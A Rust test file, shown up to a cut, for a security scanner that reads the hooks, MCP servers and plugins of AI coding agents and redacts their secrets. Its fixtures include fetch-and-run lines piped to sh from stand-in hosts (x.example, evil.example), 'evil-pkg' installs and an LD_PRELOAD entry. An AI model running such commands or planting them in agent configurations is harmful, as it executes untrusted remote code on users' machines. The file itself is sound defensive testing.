//! Tests of reading what AI coding agents start out of their configuration.

use std::collections::HashSet;
use std::fs;
use std::os::unix::fs::symlink;
use std::path::Path;

use super::entry::{is_pinned, plugin_root_readings, remote, without_port};
use super::redact::redacted;
use super::*;
use crate::autorun::Category;
use crate::rules::RuleId;
use crate::sweep::collect::{self, Body, Origin};
use crate::sweep::index::PackageIndex;
use crate::sweep::judge::secrets::{is_secret_name, without_secrets};
use crate::sweep::tier::Tier;
use crate::test_support::TempDir;

fn write(root: &Path, path: &str, text: &str) {
    fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
    fs::write(root.join(path), text).unwrap();
}

/// What the agents' configuration under `root` gives, for the home
/// `home/u` with the default directories.
fn found_in(root: &Path) -> Found {
    found_with(root, &Dirs::new("home/u", &Variables::default(), None))
}

/// What the agents' configuration under `root` gives, read from `dirs`.
fn found_with(root: &Path, dirs: &Dirs) -> Found {
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    let mut found = Found::default();
    claude::collect(&scope, Some(dirs), &mut found);
    opencode::collect(&scope, dirs, &mut found);
    codex::collect(&scope, &dirs.codex, &mut found);
    found
}

fn text(item: &Item) -> &str {
    match &item.body {
        Body::Text(text) => text,
        other => panic!("{} has no text: {other:?}", item.path),
    }
}

/// The item at `path`, which must be there.
fn at<'a>(found: &'a Found, path: &str) -> &'a Item {
    found
        .items
        .iter()
        .find(|item| item.path == path)
        .unwrap_or_else(|| {
            let paths: Vec<&str> = found.items.iter().map(|item| item.path.as_str()).collect();
            panic!("no item {path} in {paths:?}")
        })
}

#[test]
fn claude_settings_give_an_item_for_each_hook_status_line_and_helper() {
    let dir = TempDir::new("agents-claude-settings");
    let root = dir.path();
    write(
        root,
        "home/u/.claude/settings.json",
        r#"{
          "model": "opus",
          "env": {"ANTHROPIC_API_KEY": "sk-ant-secret-1"},
          "hooks": {
            "PreToolUse": [
              {"matcher": "Bash", "hooks": [
                {"type": "command", "command": "~/.claude/hooks/guard.sh \"$CLAUDE_PROJECT_DIR\""},
                {"type": "prompt", "prompt": "Is this safe?"}
              ]},
              {"matcher": "Edit|Write", "hooks": [{"type": "command", "command": "npx -y formatter"}]}
            ],
            "Stop": [{"hooks": [{"type": "http", "url": "https://u:pw@hooks.example.com/x?token=abc"}]}],
            "Weird/Event\n": [{"hooks": [{"command": "true"}]}]
          },
          "statusLine": {"type": "command", "command": "bash ~/.claude/statusline.sh"},
          "apiKeyHelper": "/usr/local/bin/get-key"
        }"#,
    );
    write(
        root,
        "home/u/.claude/settings.local.json",
        r#"{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "echo hi"}]}]}}"#,
    );
    let found = found_in(root);
    assert_eq!(found.unchecked, Vec::<String>::new());

    let guard = at(&found, "home/u/.claude/settings.json#hooks/PreToolUse/0/0");
    assert_eq!(
        text(guard),
        "~/.claude/hooks/guard.sh \"$CLAUDE_PROJECT_DIR\"\n"
    );
    assert_eq!(
        guard.runs,
        ["~/.claude/hooks/guard.sh \"$CLAUDE_PROJECT_DIR\""]
    );
    assert_eq!(guard.category, Category::Agent);
    assert_eq!(guard.origin, Origin::User);
    assert_eq!(guard.tier, Tier::Unknown);
    assert_eq!(guard.sha256, Some(Sha256::digest(text(guard).as_bytes())));
    // A prompt hook asks a model and starts nothing.
    assert!(
        found
            .items
            .iter()
            .all(|item| !item.path.ends_with("PreToolUse/0/1"))
    );
    at(&found, "home/u/.claude/settings.json#hooks/PreToolUse/1/0");
    at(&found, "home/u/.claude/settings.json#statusLine");
    at(&found, "home/u/.claude/settings.json#apiKeyHelper");
    at(
        &found,
        "home/u/.claude/settings.local.json#hooks/SessionStart/0/0",
    );

    // A web hook is its scheme and host, and an alert.
    let web = at(&found, "home/u/.claude/settings.json#hooks/Stop/0/0");
    assert_eq!(text(web), "https://hooks.example.com\n");
    assert!(web.runs.is_empty());
    assert_eq!(web.alerts.len(), 1);
    assert_eq!(web.alerts[0].0, RuleId::RiskyConfiguration);

    // An event name that is no plain name is named by its digest.
    let odd: Vec<&Item> = found
        .items
        .iter()
        .filter(|item| text(item) == "true\n")
        .collect();
    assert_eq!(odd.len(), 1);
    assert!(odd[0].path.contains("#hooks/~"), "{}", odd[0].path);
    assert!(!odd[0].path.contains('\n'));

    // Nothing else of the file is in any item.
    for item in &found.items {
        assert!(!text(item).contains("sk-ant-secret-1"));
        assert!(!text(item).contains("opus"));
        assert!(!text(item).contains("pw"));
        assert!(!text(item).contains("token=abc"));
    }
}

#[test]
fn claude_json_gives_only_its_servers_and_hides_projects_and_secrets() {
    let dir = TempDir::new("agents-claude-json");
    let root = dir.path();
    write(
        root,
        "home/u/.claude.json",
        r#"{
          "oauthAccount": {"emailAddress": "someone@example.com", "accessToken": "tok-123"},
          "mcpServers": {
            "github": {
              "command": "docker",
              "args": ["run", "-e", "GITHUB_TOKEN=ghp_literal", "--api-key", "sk-live-9",
                       "--url=https://bob:hunter2@api.example.com/v1", "image name"],
              "env": {"GITHUB_TOKEN": "ghp_in_env", "LD_PRELOAD": "/tmp/x.so"}
            },
            "docs": {"type": "http", "url": "https://mcp.example.com/mcp?key=abc"},
            "local": {"type": "sse", "url": "http://localhost:3000/sse"},
            "empty": {}
          },
          "projects": {
            "/home/u/work/secret-project": {
              "history": [{"display": "my private prompt"}],
              "mcpServers": {"db": {"command": "uvx", "args": ["db-server"]}}
            }
          }
        }"#,
    );
    let key = ProjectKey(Sha256::digest(b"a key"));
    let found = found_with(root, &Dirs::new("home/u", &Variables::default(), Some(key)));
    assert_eq!(found.unchecked, Vec::<String>::new());

    let github = at(&found, "home/u/.claude.json#mcpServers/github");
    assert_eq!(
        text(github),
        "# started with these variables set (values not read): GITHUB_TOKEN LD_PRELOAD\n\
         docker run -e GITHUB_TOKEN=<redacted-by-guardian> --api-key <redacted-by-guardian> \
         --url=https://api.example.com/v1 'image name'\n"
    );
    let docs = at(&found, "home/u/.claude.json#mcpServers/docs");
    assert_eq!(text(docs), "https://mcp.example.com\n");
    assert_eq!(docs.alerts[0].0, RuleId::RiskyConfiguration);
    let local = at(&found, "home/u/.claude.json#mcpServers/local");
    assert_eq!(text(local), "http://localhost:3000\n");
    assert!(local.alerts.is_empty());
    assert!(
        found
            .items
            .iter()
            .all(|item| !item.path.ends_with("/empty"))
    );

    // A project is named by a digest of its path keyed with a secret of
    // this machine; only the note, which stays here, names it.
    let project = found
        .items
        .iter()
        .find(|item| item.path.ends_with("/mcpServers/db"))
        .unwrap();
    let key = Sha256::digest(b"a key");
    let digest = sha256::hmac(&key, b"/home/u/work/secret-project");
    assert_eq!(
        project.path,
        format!("home/u/.claude.json#projects/{digest}/mcpServers/db")
    );
    assert_ne!(digest, Sha256::digest(b"/home/u/work/secret-project"));
    assert_eq!(text(project), "uvx db-server\n");
    assert_eq!(
        project.notes,
        ["an MCP server of one of Claude Code's projects"]
    );

    for item in &found.items {
        for kept in [
            "tok-123",
            "someone@example.com",
            "ghp_",
            "sk-live-9",
            "hunter2",
            "bob",
            "/tmp/x.so",
            "secret-project",
            "private prompt",
            "key=abc",
        ] {
            assert!(!text(item).contains(kept), "{kept} in {}", item.path);
            assert!(!item.path.contains(kept), "{kept} in {}", item.path);
        }
    }
}

#[test]
fn a_changed_entry_changes_its_digest_and_a_changed_secret_does_not() {
    let config = |token: &str, extra: &str| {
        format!(
            r#"{{"mcpServers": {{"s": {{"command": "srv", "args": ["--token", "{token}"], "env": {{"A": "{token}"{extra}}}}}}}}}"#
        )
    };
    let digest = |text: &str| {
        let dir = TempDir::new("agents-digest");
        write(dir.path(), "home/u/.claude.json", text);
        let found = found_in(dir.path());
        assert_eq!(found.items.len(), 1);
        found.items[0].sha256
    };
    let before = digest(&config("one", ""));
    assert_eq!(before, digest(&config("two", "")));
    assert_ne!(before, digest(&config("one", r#", "B": "x""#)));
}

#[test]
fn a_plugin_is_read_through_its_install_and_its_scripts_are_followed() {
    let dir = TempDir::new("agents-plugins");
    let root = dir.path();
    let cache = "home/u/.claude/plugins/cache/market/guard/1.0.0";
    write(
        root,
        "home/u/.claude/plugins/installed_plugins.json",
        &format!(
            r#"{{"version": 2, "plugins": {{
              "guard@market": [{{"scope": "user", "installPath": "/{cache}", "version": "1.0.0"}}],
              "stray@market": [{{"installPath": "/home/u/elsewhere/stray"}}],
              "bare@market": [{{"installPath": "/home/u/.claude/plugins/cache/market/bare/2"}}]
            }}}}"#
        ),
    );
    write(
        root,
        &format!("{cache}/hooks/hooks.json"),
        r#"{"description": "d", "hooks": {"SessionStart": [{"hooks": [
            {"type": "command", "command": "bash \"${CLAUDE_PLUGIN_ROOT}/hooks/start.sh\" $CLAUDE_PLUGIN_ROOT_X"}
        ]}]}}"#,
    );
    write(
        root,
        &format!("{cache}/.claude-plugin/plugin.json"),
        r#"{"name": "guard",
            "mcpServers": {"helper": {"command": "${CLAUDE_PLUGIN_ROOT}/bin/helper"}},
            "hooks": ["./hooks/hooks.json", "../../outside.json", "./more.json"]}"#,
    );
    write(
        root,
        &format!("{cache}/more.json"),
        r#"{"hooks": {"Stop": [{"hooks": [{"command": "$CLAUDE_PLUGIN_ROOT/stop"}]}]}}"#,
    );
    let found = found_in(root);
    let list = "home/u/.claude/plugins/installed_plugins.json";

    let start = at(
        &found,
        &format!("{list}#plugins/guard@market/0/hooks/SessionStart/0/0"),
    );
    let started = format!("bash \"/{cache}/hooks/start.sh\" $CLAUDE_PLUGIN_ROOT_X");
    assert_eq!(text(start), format!("{started}\n"));
    assert_eq!(start.runs, [started]);
    assert_eq!(
        start.notes,
        ["of the Claude Code plugin guard@market (version 1.0.0)"]
    );
    let helper = at(
        &found,
        &format!("{list}#plugins/guard@market/0/manifest-mcp/helper"),
    );
    assert_eq!(helper.runs, [format!("/{cache}/bin/helper")]);
    let stop = at(
        &found,
        &format!("{list}#plugins/guard@market/0/hooks-file-2/Stop/0/0"),
    );
    assert_eq!(stop.runs, [format!("/{cache}/stop")]);
    // The default hooks file the manifest names again is read once.
    let starts = found
        .items
        .iter()
        .filter(|item| item.path.contains("SessionStart"))
        .count();
    assert_eq!(starts, 1);

    assert_eq!(found.unchecked.len(), 2, "{:?}", found.unchecked);
    assert!(found.unchecked[0].contains("outside its plugin (../../outside.json)"));
    assert!(found.unchecked[1].contains("the plugin stray@market is not installed in"));
}

#[test]
fn what_cannot_be_read_is_said_and_gives_no_item() {
    let dir = TempDir::new("agents-unreadable");
    let root = dir.path();
    write(
        root,
        "home/u/dotfiles/settings.json",
        r#"{"statusLine": {"command": "x"}}"#,
    );
    fs::create_dir_all(root.join("home/u/.claude")).unwrap();
    symlink(
        "../dotfiles/settings.json",
        root.join("home/u/.claude/settings.json"),
    )
    .unwrap();
    write(root, "home/u/.claude/settings.local.json", "{\"hooks\": ");
    write(
        root,
        "home/u/.codex/config.toml",
        "[mcp_servers.x\ncommand = 1\n",
    );
    fs::create_dir_all(root.join("home/u/.config/opencode/opencode.json")).unwrap();
    let huge = fs::File::create(root.join("home/u/.claude.json")).unwrap();
    huge.set_len(MAX_CONFIG + 1).unwrap();
    let found = found_in(root);
    assert_eq!(found.items, Vec::new());
    let said = found.unchecked.join("\n");
    for expected in [
        "/home/u/.claude/settings.json: a link, which is not followed; what it starts was not checked",
        "/home/u/.claude/settings.local.json: not JSON",
        "/home/u/.claude.json: larger than 16 MiB",
        "/home/u/.codex/config.toml: not TOML Guardian can read",
        "/home/u/.config/opencode/opencode.json: not a regular file",
    ] {
        assert!(said.contains(expected), "{expected} not in {said}");
    }
    assert_eq!(found.unchecked.len(), 5, "{said}");
}

#[test]
fn opencode_servers_and_plugins_are_read_from_jsonc_and_its_plugin_directories() {
    let dir = TempDir::new("agents-opencode");
    let root = dir.path();
    write(
        root,
        "home/u/.config/opencode/opencode.jsonc",
        r#"{
          // the model, with a "string // that is not a comment"
          "model": "a/b // c",
          /* servers */
          "mcp": {
            "fs": {"type": "local", "command": ["npx", "-y", "@scope/fs-server"], "environment": {"TOKEN": "t-1"},},
            "web": {"type": "remote", "url": "https://mcp.example.org/x", "headers": {"Authorization": "Bearer b-1"}},
          },
          "plugin": ["opencode-a", "opencode-b@1.2.3", "opencode-c@latest", "file:///home/u/my plugin.js", 7],
        }"#,
    );
    write(
        root,
        "home/u/.config/opencode/plugin/notify.ts",
        "export const x = 1\n",
    );
    write(
        root,
        "home/u/.config/opencode/plugins/other.js",
        "export const y = 2\n",
    );
    write(root, "home/u/.config/opencode/plugin/README.md", "docs\n");
    write(
        root,
        "home/u/.config/opencode/plugin/node_modules/z/index.js",
        "z\n",
    );
    let found = found_in(root);
    let file = "home/u/.config/opencode/opencode.jsonc";
    assert_eq!(
        found.unchecked,
        [format!(
            "/{file}: the name of plugin/4 could not be read; what it starts was not checked"
        )]
    );

    let fs = at(&found, &format!("{file}#mcp/fs"));
    assert_eq!(
        text(fs),
        "# started with these variables set (values not read): TOKEN\nnpx -y @scope/fs-server\n"
    );
    let web = at(&found, &format!("{file}#mcp/web"));
    assert_eq!(text(web), "https://mcp.example.org\n");
    assert_eq!(web.alerts[0].0, RuleId::RiskyConfiguration);

    let alerted = |index: usize| {
        let plugin = at(&found, &format!("{file}#plugin/{index}"));
        plugin
            .alerts
            .iter()
            .any(|(rule, _)| *rule == RuleId::RemoteCodeInstall)
    };
    assert_eq!(
        text(at(&found, &format!("{file}#plugin/0"))),
        "npm package opencode-a\n"
    );
    assert!(alerted(0));
    assert!(!alerted(1));
    assert!(alerted(2));
    let local = at(&found, &format!("{file}#plugin/3"));
    assert_eq!(local.runs, ["'/home/u/my plugin.js'"]);
    assert!(local.alerts.is_empty());
    assert!(
        found
            .items
            .iter()
            .all(|item| !item.path.ends_with("plugin/4"))
    );

    let files: Vec<&str> = found
        .items
        .iter()
        .filter(|item| item.path.contains("/plugin") && !item.path.contains('#'))
        .map(|item| item.path.as_str())
        .collect();
    assert_eq!(
        files,
        [
            "home/u/.config/opencode/plugin/notify.ts",
            "home/u/.config/opencode/plugins/other.js"
        ]
    );
    let plugin = at(&found, "home/u/.config/opencode/plugin/notify.ts");
    assert_eq!(plugin.category, Category::Agent);
    assert_eq!(text(plugin), "export const x = 1\n");
    assert!(plugin.runs.is_empty());
    for item in &found.items {
        for kept in ["t-1", "b-1", "a/b"] {
            assert!(!text(item).contains(kept), "{kept} in {}", item.path);
        }
    }
}

#[test]
fn codex_servers_and_notify_are_read_from_its_toml() {
    let dir = TempDir::new("agents-codex");
    let root = dir.path();
    write(
        root,
        "home/u/.codex/config.toml",
        r#"
model = "gpt"
notify = ["python3", "/home/u/.codex/notify.py"]

[mcp_servers.search]
command = "npx"
args = ["-y", "search-mcp"]
env = { "API_KEY" = "k-1", REGION = "eu" }

[mcp_servers.search.env]
EXTRA = "e-1"

[mcp_servers."odd name"]
url = "https://user:pw@remote.example.net/mcp"

[mcp_servers.nothing]
startup_timeout_sec = 5
"#,
    );
    let found = found_in(root);
    assert_eq!(found.unchecked, Vec::<String>::new());
    let file = "home/u/.codex/config.toml";
    let notify = at(&found, &format!("{file}#notify"));
    assert_eq!(notify.runs, ["python3 /home/u/.codex/notify.py"]);
    let search = at(&found, &format!("{file}#mcp_servers/search"));
    assert_eq!(
        text(search),
        "# started with these variables set (values not read): API_KEY REGION EXTRA\nnpx -y search-mcp\n"
    );
    let odd = found
        .items
        .iter()
        .find(|item| text(item) == "https://remote.example.net\n")
        .unwrap();
    assert!(odd.path.starts_with(&format!("{file}#mcp_servers/~")));
    assert_eq!(found.items.len(), 3);
    for item in &found.items {
        for kept in ["k-1", "e-1", "eu", "pw", "gpt"] {
            assert!(!text(item).contains(kept), "{kept} in {}", item.path);
        }
    }
}

#[test]
fn the_managed_files_are_read_without_a_home() {
    let dir = TempDir::new("agents-managed");
    let root = dir.path();
    write(
        root,
        "etc/claude-code/managed-settings.json",
        r#"{"hooks": {"PreToolUse": [{"hooks": [{"command": "/usr/local/bin/audit"}]}]}}"#,
    );
    write(
        root,
        "etc/claude-code/managed-mcp.json",
        r#"{"mcpServers": {"corp": {"command": "/opt/corp/mcp"}}}"#,
    );
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    let found = collect(&scope);
    let paths: Vec<&str> = found.items.iter().map(|item| item.path.as_str()).collect();
    assert_eq!(
        paths,
        [
            "etc/claude-code/managed-settings.json#hooks/PreToolUse/0/0",
            "etc/claude-code/managed-mcp.json#mcpServers/corp"
        ]
    );
    assert!(found.items.iter().all(|item| item.origin == Origin::Root));
}

#[test]
fn the_sweep_follows_what_a_hook_and_a_plugin_run() {
    let dir = TempDir::new("agents-followed");
    let root = dir.path();
    write(
        root,
        "home/u/.claude/settings.json",
        r#"{"hooks": {"Stop": [{"hooks": [{"command": "echo start && ~/.claude/hooks/stop.sh"}]}]}}"#,
    );
    write(
        root,
        "home/u/.claude/hooks/stop.sh",
        "#!/bin/sh\n/home/u/.local/share/x/payload\n",
    );
    write(
        root,
        "home/u/.local/share/x/payload",
        "#!/bin/sh\ncurl https://x.example | sh\n",
    );
    let cache = "home/u/.claude/plugins/cache/m/p/1";
    write(
        root,
        "home/u/.claude/plugins/installed_plugins.json",
        &format!(r#"{{"plugins": {{"p@m": [{{"installPath": "/{cache}"}}]}}}}"#),
    );
    write(
        root,
        &format!("{cache}/hooks/hooks.json"),
        r#"{"hooks": {"PostToolUse": [{"hooks": [{"command": "${CLAUDE_PLUGIN_ROOT}/run.sh"}]}]}}"#,
    );
    write(root, &format!("{cache}/run.sh"), "#!/bin/sh\necho plugin\n");
    let index = PackageIndex::with_foreign(HashSet::new());
    let collection = collect::collect(&Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    });
    let run_by = |path: &str| {
        collection
            .items
            .iter()
            .find(|item| item.path == path)
            .unwrap_or_else(|| panic!("{path} was not collected"))
            .run_by
            .clone()
    };
    assert_eq!(
        run_by("home/u/.claude/hooks/stop.sh").as_deref(),
        Some("home/u/.claude/settings.json#hooks/Stop/0/0")
    );
    assert_eq!(
        run_by("home/u/.local/share/x/payload").as_deref(),
        Some("home/u/.claude/hooks/stop.sh")
    );
    assert_eq!(
        run_by(&format!("{cache}/run.sh")).as_deref(),
        Some("home/u/.claude/plugins/installed_plugins.json#plugins/p@m/0/hooks/PostToolUse/0/0")
    );
}

#[test]
fn the_environment_moves_each_agents_directory() {
    let defaults = Dirs::new("home/u", &Variables::default(), None);
    assert_eq!(
        defaults,
        Dirs {
            claude: "home/u/.claude".into(),
            claude_json: "home/u/.claude.json".into(),
            opencode: "home/u/.config/opencode".into(),
            opencode_extra: None,
            opencode_config: None,
            codex: "home/u/.codex".into(),
            project_key: None,
        }
    );
    let variables = Variables {
        claude_config_dir: Some("srv/claude".into()),
        xdg_config_home: Some("home/u/conf".into()),
        opencode_config_dir: Some("home/u/oc".into()),
        opencode_config: Some("home/u/oc.json".into()),
        codex_home: Some("opt/codex".into()),
    };
    let moved = Dirs::new("home/u", &variables, None);
    assert_eq!(
        moved,
        Dirs {
            claude: "srv/claude".into(),
            claude_json: "srv/claude/.claude.json".into(),
            opencode: "home/u/conf/opencode".into(),
            opencode_extra: Some("home/u/oc".into()),
            opencode_config: Some("home/u/oc.json".into()),
            codex: "opt/codex".into(),
            project_key: None,
        }
    );
    assert_eq!(relative("/srv/claude/").as_deref(), Some("srv/claude"));
    for odd in ["", "/", "relative/dir", "/a/../b", "/a//b", "/./a"] {
        assert_eq!(relative(odd), None, "{odd}");
    }
}

#[test]
fn a_variable_set_to_no_plain_path_is_said_and_the_default_read() {
    use std::os::unix::ffi::OsStringExt as _;

    let mut found = Found::default();
    let os = |text: &str| Some(OsString::from(text));
    assert_eq!(
        checked("CODEX_HOME", os("/opt/codex/"), &mut found).as_deref(),
        Some("opt/codex")
    );
    assert_eq!(checked("CODEX_HOME", None, &mut found), None);
    assert_eq!(found.unchecked, Vec::<String>::new());
    assert_eq!(
        checked("CLAUDE_CONFIG_DIR", os("relative/claude"), &mut found),
        None
    );
    let not_utf8 = Some(OsString::from_vec(vec![b'/', 0xff]));
    assert_eq!(checked("XDG_CONFIG_HOME", not_utf8, &mut found), None);
    assert_eq!(
        checked("OPENCODE_CONFIG", os("/a/../b.json"), &mut found),
        None
    );
    let said: Vec<&str> = found
        .unchecked
        .iter()
        .map(|line| line.split_once(' ').unwrap().0)
        .collect();
    assert_eq!(
        said,
        ["CLAUDE_CONFIG_DIR", "XDG_CONFIG_HOME", "OPENCODE_CONFIG"]
    );
    assert!(found.unchecked[0].ends_with("was not checked"));
}

#[test]
fn the_root_checks_read_the_defaults_and_write_no_key() {
    let dir = TempDir::new("agents-root-dirs");
    let index = PackageIndex::with_foreign(HashSet::new());
    // The home of the user running the tests, which would read its
    // environment and keep a key, were the checks not root's.
    let own = env::var("HOME").unwrap_or_default();
    let home = own.trim_matches('/');
    let scope = Scope {
        root: dir.path(),
        home: Some(home),
        index: &index,
        origin: Origin::Root,
    };
    let mut found = Found::default();
    let dirs = Dirs::of(&scope, &mut found).unwrap();
    assert_eq!(dirs, Dirs::new(home, &Variables::default(), None));
    assert_eq!(found.unchecked, Vec::<String>::new());
}

#[test]
fn a_home_that_is_not_the_users_own_reads_the_defaults_without_a_key() {
    let dir = TempDir::new("agents-other-home");
    let index = PackageIndex::with_foreign(HashSet::new());
    // No `HOME` a test runs with is this one.
    let home = "home/not-the-user-running-the-tests";
    let scope = Scope {
        root: dir.path(),
        home: Some(home),
        index: &index,
        origin: Origin::System,
    };
    let mut found = Found::default();
    let dirs = Dirs::of(&scope, &mut found).unwrap();
    assert_eq!(dirs, Dirs::new(home, &Variables::default(), None));
    assert_eq!(found.unchecked, Vec::<String>::new());
    let no_home = Scope {
        home: None,
        ..scope
    };
    assert_eq!(Dirs::of(&no_home, &mut found), None);
}

#[test]
fn keys_are_plain_or_a_digest_and_never_two_parts() {
    assert_eq!(key_part("PreToolUse"), "PreToolUse");
    assert_eq!(key_part("guard@market"), "guard@market");
    let odd = [
        "a/b",
        "a\nb",
        "",
        ".hidden",
        "with space",
        "#hash",
        &"x".repeat(65),
    ];
    let parts: HashSet<String> = odd.iter().map(|name| key_part(name)).collect();
    assert_eq!(parts.len(), odd.len());
    for part in parts {
        assert!(part.starts_with('~') && part.len() == 65, "{part}");
    }
}

#[test]
fn jsonc_loses_comments_and_trailing_commas_and_keeps_strings() {
    let text =
        "{\"a\": \"// no /* no */\", // yes\n\"b\": [1, 2, /* x */ ],\n\"c\": \"\\\"//\\\"\",\n}";
    assert_eq!(
        Json::parse(&without_comments(text)).unwrap(),
        Json::parse(r#"{"a": "// no /* no */", "b": [1, 2], "c": "\"//\""}"#).unwrap()
    );
    // An unclosed comment swallows the rest, which then is no JSON.
    assert!(Json::parse(&without_comments("{\"a\": 1 /* open")).is_err());
}

#[test]
fn command_lines_quote_what_a_shell_would_split() {
    let line = |program: &str, args: &[&str]| {
        let args: Vec<String> = args.iter().map(|arg| (*arg).to_string()).collect();
        command_line(program, &args)
    };
    assert_eq!(
        line("node", &["${HOME}/x.js", "--port=3"]),
        "node ${HOME}/x.js --port=3"
    );
    assert_eq!(line("my tool", &["it's"]), r"'my tool' 'it'\''s'");
    assert_eq!(line("x", &[""]), "x ''");
}

#[test]
fn a_line_loses_its_secrets_and_keeps_what_a_review_needs() {
    for (line, expected) in [
        (
            "x --password p --keymap k --auth-token=t",
            "x --password <redacted-by-guardian> --keymap k --auth-token=<redacted-by-guardian>",
        ),
        (
            "x --authToken t --clientSecret 's'",
            "x --authToken <redacted-by-guardian> --clientSecret '<redacted-by-guardian>'",
        ),
        (
            "x --api-key $KEY --token-file ~/.t",
            "x --api-key $KEY --token-file ~/.t",
        ),
        (
            r#"curl -H "Authorization: Bearer abc" -H 'authorization:token xyz' u"#,
            r#"curl -H "Authorization: Bearer <redacted-by-guardian>" -H 'authorization:token <redacted-by-guardian>' u"#,
        ),
        (
            "curl -H 'Authorization: token xyz' -H 'Authorization:abc' u",
            "curl -H 'Authorization: token <redacted-by-guardian>' -H 'Authorization:<redacted-by-guardian>' u",
        ),
        (
            "curl --oauth2-bearer abc u",
            "curl --oauth2-bearer <redacted-by-guardian> u",
        ),
        // A scheme counts only inside an `Authorization` header, and a
        // header's value only inside the quotes it opened.
        ("x Bearer abc", "x Bearer abc"),
        (
            "curl -fsSL basic https://evil.example/install.sh | sh",
            "curl -fsSL basic https://evil.example/install.sh | sh",
        ),
        (
            r#"curl -H "Authorization:" https://evil.example/x.sh | sh"#,
            r#"curl -H "Authorization:" https://evil.example/x.sh | sh"#,
        ),
        ("uvx --with basic evil-pkg", "uvx --with basic evil-pkg"),
        (
            r#"curl -H "Authorization:" evil-pkg"#,
            r#"curl -H "Authorization:" evil-pkg"#,
        ),
        (
            r#"curl -H "Authorization: Bearer" evil-pkg"#,
            r#"curl -H "Authorization: Bearer" evil-pkg"#,
        ),
        (
            "curl -H 'authorization:token' evil-pkg",
            "curl -H 'authorization:token' evil-pkg",
        ),
        // An address or a path is never a token, whatever names it.
        (
            "x --auth-url https://evil.example --api-key bin/x.sh",
            "x --auth-url https://evil.example --api-key bin/x.sh",
        ),
        (
            "KEY_SERVER=https://keys.example x --password-command bin/x.sh",
            "KEY_SERVER=https://keys.example x --password-command bin/x.sh",
        ),
        (
            "docker run --env=API_KEY=k -e GITHUB_TOKEN=g --env=REGION=eu",
            "docker run --env=API_KEY=<redacted-by-guardian> -e GITHUB_TOKEN=<redacted-by-guardian> --env=REGION=eu",
        ),
        (
            "git clone git+https://me:s3cret@git.example/r.git https://tok@h.example",
            "git clone git+https://git.example/r.git https://h.example",
        ),
        ("x mail=a@b.example", "x mail=a@b.example"),
    ] {
        assert_eq!(redacted(line), expected, "{line}");
    }
}

#[test]
fn only_a_value_that_is_a_secret_is_taken_out() {
    for (line, expected) in [
        // A scheme counts only after a header, not after a secret-named
        // flag: the flag's value is taken out, the package after it stays.
        (
            "npx --auth token evil-pkg",
            "npx --auth <redacted-by-guardian> evil-pkg",
        ),
        (
            "uvx --api-key basic evil-pkg",
            "uvx --api-key <redacted-by-guardian> evil-pkg",
        ),
        (
            "npx --token bearer evil-pkg",
            "npx --token <redacted-by-guardian> evil-pkg",
        ),
        // A header whose quote opens inside the word.
        (
            r#"wget --header="Authorization: Bearer abc123" https://x/y"#,
            r#"wget --header="Authorization: Bearer <redacted-by-guardian>" https://x/y"#,
        ),
        (
            r#"curl -H"Authorization: Bearer abc123" https://x/y"#,
            r#"curl -H"Authorization: Bearer <redacted-by-guardian>" https://x/y"#,
        ),
        // A `--no-` flag takes no value.
        ("npx --no-auth evil-pkg", "npx --no-auth evil-pkg"),
        // A flag is never a value.
        (
            "npx --token --package=evil-pkg cmd",
            "npx --token --package=evil-pkg cmd",
        ),
        // A flag counts only where the last part of its name is a secret.
        ("x --auth-command evil-cmd", "x --auth-command evil-cmd"),
        (
            "x --password-command evil-pkg",
            "x --password-command evil-pkg",
        ),
        ("x --token-file evil.sh", "x --token-file evil.sh"),
        ("x --token-file=evil.sh", "x --token-file=evil.sh"),
        (
            "docker login --password-stdin ghcr.io",
            "docker login --password-stdin ghcr.io",
        ),
        (
            "x --api-key a --authToken b --clientSecret c --oauth2-bearer d",
            "x --api-key <redacted-by-guardian> --authToken <redacted-by-guardian> \
             --clientSecret <redacted-by-guardian> --oauth2-bearer <redacted-by-guardian>",
        ),
        // Only the first word of a quoted value of several.
        (
            r#"x --token "abc def""#,
            r#"x --token "<redacted-by-guardian> def""#,
        ),
    ] {
        assert_eq!(redacted(line), expected, "{line}");
    }
}

#[test]
fn a_secret_name_is_found_in_every_way_it_is_written() {
    for name in [
        "OPENAI_API_KEY",
        "--api-key",
        "--authToken",
        "--clientSecret",
        "clientSecret",
        "PGPASSWORD",
        "Bearer",
        "x-auth-token",
    ] {
        assert!(is_secret_name(name), "{name}");
    }
    for name in [
        "KEYMAP",
        "AuthorizedKeysCommand",
        "--port",
        "monkey",
        "--keymap",
    ] {
        assert!(!is_secret_name(name), "{name}");
    }
}

#[test]
fn the_plugin_directory_is_written_in_only_for_its_own_variable() {
    let root = Some("home/u/p");
    assert_eq!(
        plugin_root_readings(
            "${CLAUDE_PLUGIN_ROOT}/a $CLAUDE_PLUGIN_ROOT/b $CLAUDE_PLUGIN_ROOTS",
            root
        ),
        ["/home/u/p/a /home/u/p/b $CLAUDE_PLUGIN_ROOTS"]
    );
    assert_eq!(
        plugin_root_readings("$CLAUDE_PLUGIN_ROOT", root),
        ["/home/u/p"]
    );
    // A brace after the expansion is text, as bash reads it.
    assert_eq!(
        plugin_root_readings("${CLAUDE_PLUGIN_ROOT}x}", root),
        ["/home/u/px}"]
    );
    assert_eq!(
        plugin_root_readings("${CLAUDE_PLUGIN_ROOT}/a", None),
        ["${CLAUDE_PLUGIN_ROOT}/a"]
    );
}

#[test]
fn a_plugin_directory_default_stays_in_the_text_and_both_readings_are_followed() {
    let root = Some("home/u/p");
    // As trailofbits' modern-python writes its hook: Claude Code sets the
    // variable, but the line may unset it first, and the default then
    // names what runs.
    assert_eq!(
        plugin_root_readings(
            r#"bash "${CLAUDE_PLUGIN_ROOT:-.}/hooks/a.sh" ${CLAUDE_PLUGIN_ROOT-x}/b ${CLAUDE_PLUGIN_ROOT:=y}/c"#,
            root
        ),
        [
            r#"bash "${CLAUDE_PLUGIN_ROOT:-.}/hooks/a.sh" ${CLAUDE_PLUGIN_ROOT-x}/b ${CLAUDE_PLUGIN_ROOT:=y}/c"#,
            r#"bash "/home/u/p/hooks/a.sh" /home/u/p/b /home/u/p/c"#,
            r#"bash "./hooks/a.sh" x/b y/c"#,
        ]
    );
    assert_eq!(
        plugin_root_readings(
